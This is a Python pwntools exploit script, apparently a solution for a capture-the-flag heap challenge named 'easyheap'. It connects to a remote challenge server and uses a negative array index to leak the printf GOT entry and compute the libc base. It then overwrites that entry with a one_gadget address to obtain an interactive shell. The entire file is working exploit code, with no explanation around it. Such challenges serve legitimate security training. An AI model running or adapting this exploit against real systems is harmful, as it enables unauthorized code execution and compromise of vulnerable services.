#!/usr/bin/env python3
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

libc = ELF("./easyheap_libc.so.6")

r = remote("easyheap.acebear.site", 3002)
#r = process("./easy_heap", env = {"LD_PRELOAD": "./easyheap_libc.so.6"})
#gdb.attach(proc.pidof(r)[0])

def create(index, name):
    print("create", index, name)
    r.sendlineafter("Your choice: ", "1")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Input this name: ", name)

def edit(index, name):
    print("edit", index, name)
    r.sendlineafter("Your choice: ", "2")
    r.sendlineafter("Index: ", str(index))
    r.sendlineafter("Input new name: ", name)

def delete(index):
    print("delete", index)
    r.sendlineafter("Your choice: ", "3")
    r.sendlineafter("Index: ", str(index))

def show(index):
    print("show", index)
    r.sendlineafter("Your choice: ", "4")
    r.sendlineafter("Index: ", str(index))
    r.recvuntil("is: ")
    return r.recvline()

buf = 0x0804b0a0
name = 0x0804b0e0
printf_got = 0x0804b014
one_gadget = 0x3a80e

r.sendlineafter("Give me your name: ", p32(printf_got))
r.sendlineafter("Your age: ", "100")

result = show(-(0x100000000 - (name - buf)) // 4)
libc.address = u32(result[:4]) - libc.symbols[b"printf"]
print("libc address:", hex(libc.address))

edit(-(0x100000000 - (name - buf)) // 4, p32(libc.address + one_gadget))

r.interactive()
